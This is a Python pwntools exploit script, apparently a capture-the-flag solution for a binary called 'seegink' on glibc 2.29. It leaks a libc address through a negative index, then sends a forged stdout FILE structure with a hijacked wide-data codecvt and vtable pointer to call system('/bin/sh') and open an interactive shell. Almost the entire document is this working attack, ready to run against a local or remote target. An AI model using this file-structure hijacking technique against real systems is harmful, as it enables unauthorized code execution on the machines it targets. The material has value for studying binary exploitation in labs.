#!/usr/bin/env python3

from pwn import *

exe = ELF("../bin/seegink")
libc = ELF("./libc-2.29.so")
ld = ELF("./ld-2.29.so")

context.binary = exe

host = args.HOST or "localhost"
port = args.PORT or 30001

def local():
  return process([ld.path, exe.path], env={"LD_PRELOAD": libc.path})

def conn():
  if args.LOCAL:
    return local()
  else:
    return remote(host, port)

def debug():
  if args.LOCAL:
    gdb.attach(r, gdbscript=gdbscript)
    pause()

gdbscript = f'''
file {exe.path}
'''

r = conn()

# good luck pwning :)

r.recvuntil("See the ginkoid:")
r.sendline("-6")
r.recvuntil(b"\x7f\x00\x00")
libc.address = u64(r.recv(8)) - (0x7f8d93f8d7e3 - 0x7f8d93da8000)
log.info(f"LIBC {libc.address:x}")

binsh = next(libc.search(b"/bin/sh\x00"))
end = (binsh-100)//2

stdout = (
  p64(0) + p64(1) + p64(0) # fp->_wide_data->_IO_read_ptr - fp->_wide_data->_IO_read_end
  + p64(0)*14
  + p64(libc.sym["_IO_stdfile_1_lock"]) # _lock
  + p64(0)
  + p64(libc.sym["_IO_2_1_stdout_"] + 0xa8) # codecvt pointer
  + p64(libc.sym["_IO_2_1_stdout_"] + 8) # _wide_data
  + b"/bin/sh\x00"  # codecvt
  + p64(0)*3
  + p64(libc.sym["system"]) # codecvt_do_encoding
  + p64(0)
  + p64(libc.sym["_IO_wfile_jumps"] + 5*8) # vtable wfile_sync
)

r.recvuntil("Feel the ginkoid:")
debug()
r.send(stdout[2:])

r.interactive()
